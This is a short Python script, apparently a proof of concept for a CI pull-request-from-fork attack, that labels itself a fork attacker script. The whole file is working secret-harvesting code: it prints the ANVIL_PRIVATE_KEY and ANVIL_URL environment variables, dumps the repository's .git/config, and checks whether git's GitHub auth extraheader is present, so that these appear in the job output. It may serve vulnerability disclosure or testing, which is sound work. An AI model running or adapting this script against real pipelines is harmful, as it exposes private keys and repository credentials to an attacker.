import os, sys, subprocess
print("FORK_ATTACKER_SCRIPT_EXECUTED argv=", sys.argv[1:])
print("FORK_STOLEN_ANVIL_PRIVATE_KEY=" + os.environ.get("ANVIL_PRIVATE_KEY", "<unset>"))
print("FORK_STOLEN_ANVIL_URL=" + os.environ.get("ANVIL_URL", "<unset>"))
try:
    cfg = open(".git/config").read().replace("\n", " | ")
    print("FORK_GITCONFIG=" + cfg[:1500])
except Exception as e:
    print("FORK_GITCONFIG_ERR", e)
r = subprocess.run(["git","config","--get","http.https://github.com/.extraheader"],capture_output=True,text=True)
print("FORK_EXTRAHEADER_PRESENT=" + str(bool(r.stdout.strip())))
